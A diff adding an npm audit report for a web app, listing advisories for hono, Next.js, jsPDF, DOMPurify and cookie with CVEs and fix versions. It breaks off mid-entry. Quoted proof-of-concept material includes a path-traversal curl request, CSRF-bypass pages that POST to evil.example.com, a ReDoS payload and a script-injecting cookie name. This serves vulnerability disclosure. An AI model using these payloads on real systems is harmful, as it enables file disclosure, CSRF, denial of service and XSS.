@@ -1,0 +1,1154 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1105772,
+          "path": "apps__web>jspdf>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "hono",
+      "resolves": [
+        {
+          "id": 1097192,
+          "path": "apps__web>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1100420,
+          "path": "apps__web>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1100533,
+          "path": "apps__web>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107532,
+          "path": "apps__web>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109151,
+          "path": "apps__web>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109205,
+          "path": "apps__web>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1097295,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1099638,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1100421,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1101438,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105461,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107226,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107420,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107512,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107513,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108291,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108953,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "jspdf",
+      "resolves": [
+        {
+          "id": 1103308,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107412,
+          "path": "apps__web>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "apps__web>@clerk/nextjs>@clerk/backend>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "xlsx",
+      "resolves": [
+        {
+          "id": 1108110,
+          "path": "apps__web>xlsx",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        },
+        {
+          "id": 1108111,
+          "path": "apps__web>xlsx",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1097192": {
+      "findings": [
+        {
+          "version": "3.12.12",
+          "paths": [
+            "apps/web > hono@3.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347\n- https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65\n- https://nvd.nist.gov/vuln/detail/CVE-2024-32869\n- https://github.com/advisories/GHSA-3mpf-rcc7-5347",
+      "created": "2024-04-23T16:20:49.000Z",
+      "id": 1097192,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWhen using serveStatic with deno, it is possible to directory traverse where main.ts is located.\n\nMy environment is configured as per this tutorial\nhttps://hono.dev/getting-started/deno\n\n### PoC\n\n```bash\n$ tree\n.\n├── deno.json\n├── deno.lock\n├── main.ts\n├── README.md\n└── static\n    └── a.txt\n```\n\nsource\n\n```jsx\nimport { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'\nimport { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'\n\nconst app = new Hono()\napp.use('/static/*', serveStatic({ root: './' }))\n\nDeno.serve(app.fetch)\n```\n\nrequest\n\n```bash\ncurl localhost:8000/static/%2e%2e/main.ts\n```\n\nresponse is content of main.ts\n\n### Impact\n\nUnexpected files are retrieved.",
+      "reported_by": null,
+      "title": "Hono vulnerable to Restricted Directory Traversal in serveStatic with deno",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-32869"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.2.7",
+      "github_advisory_id": "GHSA-3mpf-rcc7-5347",
+      "recommendation": "Upgrade to version 4.2.7 or later",
+      "patched_versions": ">=4.2.7",
+      "updated": "2024-04-24T14:26:48.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-3mpf-rcc7-5347"
+    },
+    "1097295": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g\n- https://github.com/vercel/next.js/pull/62561\n- https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085\n- https://nvd.nist.gov/vuln/detail/CVE-2024-34351\n- https://github.com/advisories/GHSA-fr5h-rqp8-mj6g",
+      "created": "2024-05-09T21:18:57.000Z",
+      "id": 1097295,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA Server-Side Request Forgery (SSRF) vulnerability was identified in Next.js Server Actions by security researchers at Assetnote. If the `Host` header is modified, and the below conditions are also met, an attacker may be able to make requests that appear to be originating from the Next.js application server itself.\n\n#### Prerequisites\n* Next.js (`<14.1.1`) is running in a self-hosted* manner.\n* The Next.js application makes use of Server Actions.\n* The Server Action performs a redirect to a relative path which starts with a `/`.\n\n\\* Many hosting providers (including Vercel) route requests based on the Host header, so we do not believe that this vulnerability affects any Next.js applications where routing is done in this manner.\n\n### Patches\nThis vulnerability was patched in [#62561](https://github.com/vercel/next.js/pull/62561) and fixed in Next.js `14.1.1`.\n \n### Workarounds\nThere are no official workarounds for this vulnerability. We recommend upgrading to Next.js `14.1.1`.\n\n### Credit\nVercel and the Next.js team thank Assetnote for responsibly disclosing this issue to us, and for working with us to verify the fix. Thanks to:\n\nAdam Kues - Assetnote\nShubham Shah - Assetnote",
+      "reported_by": null,
+      "title": "Next.js Server-Side Request Forgery in Server Actions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-34351"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.4.0 <14.1.1",
+      "github_advisory_id": "GHSA-fr5h-rqp8-mj6g",
+      "recommendation": "Upgrade to version 14.1.1 or later",
+      "patched_versions": ">=14.1.1",
+      "updated": "2024-05-14T20:02:43.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-fr5h-rqp8-mj6g"
+    },
+    "1099638": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9\n- https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3\n- https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda\n- https://nvd.nist.gov/vuln/detail/CVE-2024-46982\n- https://github.com/advisories/GHSA-gp8f-8m3g-qvj9",
+      "created": "2024-09-17T21:58:09.000Z",
+      "id": 1099638,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nBy sending a crafted HTTP request, it is possible to poison the cache of a non-dynamic server-side rendered route in the pages router (this does not affect the app router). When this crafted request is sent it could coerce Next.js to cache a route that is meant to not be cached and send a `Cache-Control: s-maxage=1, stale-while-revalidate` header which some upstream CDNs may cache as well. \n\nTo be potentially affected all of the following must apply: \n\n- Next.js between 13.5.1 and 14.2.9\n- Using pages router\n- Using non-dynamic server-side rendered routes e.g. `pages/dashboard.tsx` not `pages/blog/[slug].tsx`\n\nThe below configurations are unaffected:\n\n- Deployments using only app router\n- Deployments on [Vercel](https://vercel.com/) are not affected\n\n\n### Patches\n\nThis vulnerability was resolved in Next.js v13.5.7, v14.2.10, and later. We recommend upgrading regardless of whether you can reproduce the issue or not.\n\n### Workarounds\n\nThere are no official or recommended workarounds for this issue, we recommend that users patch to a safe version.\n\n#### Credits\n\n- Allam Rachid (zhero_)\n- Henry Chen",
+      "reported_by": null,
+      "title": "Next.js Cache Poisoning",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-46982"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.10",
+      "github_advisory_id": "GHSA-gp8f-8m3g-qvj9",
+      "recommendation": "Upgrade to version 14.2.10 or later",
+      "patched_versions": ">=14.2.10",
+      "updated": "2024-09-18T14:28:58.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-349",
+        "CWE-639"
+      ],
+      "url": "https://github.com/advisories/GHSA-gp8f-8m3g-qvj9"
+    },
+    "1100420": {
+      "findings": [
+        {
+          "version": "3.12.12",
+          "paths": [
+            "apps/web > hono@3.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr\n- https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82\n- https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89\n- https://nvd.nist.gov/vuln/detail/CVE-2024-48913\n- https://github.com/advisories/GHSA-2234-fmw7-43wr",
+      "created": "2024-10-15T17:43:50.000Z",
+      "id": 1100420,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nBypass CSRF Middleware by a request without Content-Type herader.\n\n### Details\nAlthough the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.\n\nhttps://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89\n\n### PoC\n```server.js\n// server.js\nimport { Hono } from 'hono'\nimport { csrf }from 'hono/csrf'\nconst app = new Hono()\napp.use(csrf())\napp.get('/', (c) => {\n  return c.html('Hello Hono!')\n})\napp.post('/', async (c) => {\n  console.log(\"executed\")\n  return c.text( await c.req.text())\n})\nDeno.serve(app.fetch)\n```\n\n```poc.html\n<!-- PoC.html -->\n<script>\nasync function myclick() {\n    await fetch(\"http://evil.example.com\", {\n    method: \"POST\",\n    credentials: \"include\",\n    body:new Blob([`test`],{}),\n    });\n}\n</script>\n<input type=\"button\" onclick=\"myclick()\" value=\"run\" />\n```\n\nSimilarly, the fetch API does not add a Content-Type header for requests that do not include a Body.\n```PoC2.js\nawait fetch(\"http://localhost:8000\", { method: \"POST\", credentials: \"include\"});\n```\n\n### Impact\nBypass csrf protection implemented with hono csrf middleware.\n",
+      "reported_by": null,
+      "title": "Hono allows bypass of CSRF Middleware by a request without Content-Type header.",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-48913"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.6.5",
+      "github_advisory_id": "GHSA-2234-fmw7-43wr",
+      "recommendation": "Upgrade to version 4.6.5 or later",
+      "patched_versions": ">=4.6.5",
+      "updated": "2024-11-07T18:33:22.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-352"
+      ],
+      "url": "https://github.com/advisories/GHSA-2234-fmw7-43wr"
+    },
+    "1100421": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g77x-44xx-532m\n- https://nvd.nist.gov/vuln/detail/CVE-2024-47831\n- https://github.com/vercel/next.js/commit/d11cbc9ff0b1aaefabcba9afe1e562e0b1fde65a\n- https://github.com/advisories/GHSA-g77x-44xx-532m",
+      "created": "2024-10-14T19:45:21.000Z",
+      "id": 1100421,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nThe image optimization feature of Next.js contained a vulnerability which allowed for a potential Denial of Service (DoS) condition which could lead to excessive CPU consumption.\n\n**Not affected:**\n- The `next.config.js` file is configured with `images.unoptimized` set to `true` or `images.loader` set to a non-default value.\n- The Next.js application is hosted on Vercel. \n\n### Patches\nThis issue was fully patched in Next.js `14.2.7`. We recommend that users upgrade to at least this version.\n\n### Workarounds\nEnsure that the `next.config.js` file has either `images.unoptimized`, `images.loader` or `images.loaderFile` assigned.\n\n#### Credits\nBrandon Dahler (brandondahler), AWS\nDimitrios Vlastaras",
+      "reported_by": null,
+      "title": "Denial of Service condition in Next.js image optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47831"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <14.2.7",
+      "github_advisory_id": "GHSA-g77x-44xx-532m",
+      "recommendation": "Upgrade to version 14.2.7 or later",
+      "patched_versions": ">=14.2.7",
+      "updated": "2024-11-08T18:55:49.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-g77x-44xx-532m"
+    },
+    "1100533": {
+      "findings": [
+        {
+          "version": "3.12.12",
+          "paths": [
+            "apps/web > hono@3.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-rpfr-3m35-5vx5\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43787\n- https://github.com/honojs/hono/commit/41ce840379516410dee60c783142e05bb5a22449\n- https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17\n- https://github.com/advisories/GHSA-rpfr-3m35-5vx5",
+      "created": "2024-08-22T16:41:08.000Z",
+      "id": 1100533,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nHono CSRF middleware can be bypassed using crafted Content-Type header.\n\n### Details\n\nMIME types are case insensitive, but `isRequestedByFormElementRe` only matches lower-case.\n\nhttps://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17\n\nAs a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as \"Application/x-www-form-urlencoded\".\n\n### PoC\n\n```html\n<html>\n  <head>\n    <title>CSRF Test</title>\n    <script defer>\n      document.addEventListener(\"DOMContentLoaded\", () => {\n        document.getElementById(\"btn\").addEventListener(\"click\", async () => {\n          const res = await fetch(\"http://victim.example.com/test\", {\n            method: \"POST\",\n            credentials: \"include\",\n            headers: {\n              \"Content-Type\": \"Application/x-www-form-urlencoded\",\n            },\n          });\n        });\n      });\n    </script>\n  </head>\n  <body>\n    <h1>CSRF Test</h1>\n    <button id=\"btn\">Click me!</button>\n  </body>\n</html>\n```\n\n### Impact\n\nBypass csrf protection implemented with hono csrf middleware.\n\n### Discussion\n\nI'm not sure that omitting csrf checks for Simple POST request is a good idea.\nCSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.\n",
+      "reported_by": null,
+      "title": "Hono CSRF middleware can be bypassed using crafted Content-Type header",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-43787"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.5.8",
+      "github_advisory_id": "GHSA-rpfr-3m35-5vx5",
+      "recommendation": "Upgrade to version 4.5.8 or later",
+      "patched_versions": ">=4.5.8",
+      "updated": "2024-11-18T16:27:07.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-352"
+      ],
+      "url": "https://github.com/advisories/GHSA-rpfr-3m35-5vx5"
+    },
+    "1101438": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9\n- https://nvd.nist.gov/vuln/detail/CVE-2024-56332\n- https://github.com/advisories/GHSA-7m27-7ghc-44w9",
+      "created": "2025-01-03T20:19:29.000Z",
+      "id": 1101438,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.\n\n_Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time._\n\nDeployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.\n\nThis is the same issue as if the incoming HTTP request has an invalid `Content-Length` header or never closes. If the host has no other mitigations to those then this vulnerability is novel.\n\nThis vulnerability affects only Next.js deployments using Server Actions.\n\n### Patches\n\nThis vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.\n\n### Workarounds\n\nThere are no official workarounds for this vulnerability.\n\n### Credits\n\nThanks to the PackDraw team for responsibly disclosing this vulnerability.",
+      "reported_by": null,
+      "title": "Next.js Allows a Denial of Service (DoS) with Server Actions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-56332"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.21",
+      "github_advisory_id": "GHSA-7m27-7ghc-44w9",
+      "recommendation": "Upgrade to version 14.2.21 or later",
+      "patched_versions": ">=14.2.21",
+      "updated": "2025-01-07T16:24:09.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-7m27-7ghc-44w9"
+    },
+    "1103308": {
+      "findings": [
+        {
+          "version": "2.5.2",
+          "paths": [
+            "apps/web > jspdf@2.5.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj\n- https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29907\n- https://github.com/advisories/GHSA-w532-jxjh-hjhj",
+      "created": "2025-03-18T21:07:47.000Z",
+      "id": 1103308,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nUser control of the first argument of the `addImage` method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image urls to the `addImage` method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`, `addSvgAsImage`.\n\nExample payload:\n```js\nimport { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\\x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"a4.pdf\");\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@>=3.0.1\n\n### Workarounds\nSanitize image urls before passing it to the `addImage` method or one of the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)",
+      "reported_by": null,
+      "title": "jsPDF Bypass Regular Expression Denial of Service (ReDoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-29907"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<3.0.1",
+      "github_advisory_id": "GHSA-w532-jxjh-hjhj",
+      "recommendation": "Upgrade to version 3.0.1 or later",
+      "patched_versions": ">=3.0.1",
+      "updated": "2025-03-19T05:58:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.5.0",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > @clerk/backend@0.38.15 > cookie@0.5.0",
+            "apps/web > @clerk/nextjs@4.31.8 > @clerk/clerk-sdk-node@4.13.23 > @clerk/backend@0.38.15 > cookie@0.5.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1105461": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r\n- https://vercel.com/changelog/cve-2025-48068\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48068\n- https://github.com/advisories/GHSA-3h52-269p-cp9r",
+      "created": "2025-05-28T21:52:13.000Z",
+      "id": 1105461,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA low-severity vulnerability in **Next.js** has been fixed in **version 15.2.2**. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while `npm run dev` is active.\n\nBecause the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure `allowedDevOrigins` in your next config after upgrading to a patched version. [Learn more](https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins).\n\nLearn more: https://vercel.com/changelog/cve-2025-48068\n\n## Credit\n\nThanks to [sapphi-red](https://github.com/sapphi-red) and [Radman Siddiki](https://github.com/R4356th) for responsibly disclosing this issue.",
+      "reported_by": null,
+      "title": "Information exposure in Next.js dev server due to lack of origin verification",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48068"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0 <14.2.30",
+      "github_advisory_id": "GHSA-3h52-269p-cp9r",
+      "recommendation": "Upgrade to version 14.2.30 or later",
+      "patched_versions": ">=14.2.30",
+      "updated": "2025-06-13T14:41:22.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1385"
+      ],
+      "url": "https://github.com/advisories/GHSA-3h52-269p-cp9r"
+    },
+    "1105772": {
+      "findings": [
+        {
+          "version": "2.5.8",
+          "paths": [
+            "apps/web > jspdf@2.5.2 > dompurify@2.5.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-26791\n- https://github.com/cure53/DOMPurify/commit/d18ffcb554e0001748865da03ac75dd7829f0f02\n- https://ensy.zip/posts/dompurify-323-bypass\n- https://github.com/cure53/DOMPurify/releases/tag/3.2.4\n- https://nsysean.github.io/posts/dompurify-323-bypass\n- https://github.com/advisories/GHSA-vhxf-7vqr-mrjg",
+      "created": "2025-02-14T09:31:22.000Z",
+      "id": 1105772,
+      "npm_advisory_id": null,
+      "overview": "DOMPurify before 3.2.4 has an incorrect template literal regular expression when SAFE_FOR_TEMPLATES is set to true, sometimes leading to mutation cross-site scripting (mXSS).",
+      "reported_by": null,
+      "title": "DOMPurify allows Cross-site Scripting (XSS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-26791"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<3.2.4",
+      "github_advisory_id": "GHSA-vhxf-7vqr-mrjg",
+      "recommendation": "Upgrade to version 3.2.4 or later",
+      "patched_versions": ">=3.2.4",
+      "updated": "2025-06-30T14:24:15.000Z",
+      "cvss": {
+        "score": 4.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-vhxf-7vqr-mrjg"
+    },
+    "1107226": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g5qg-72qw-gw5v\n- https://github.com/vercel/next.js/pull/82114\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- https://vercel.com/changelog/cve-2025-57752\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57752\n- https://github.com/advisories/GHSA-g5qg-72qw-gw5v",
+      "created": "2025-08-29T22:06:22.000Z",
+      "id": 1107226,
+      "npm_advisory_id": null,
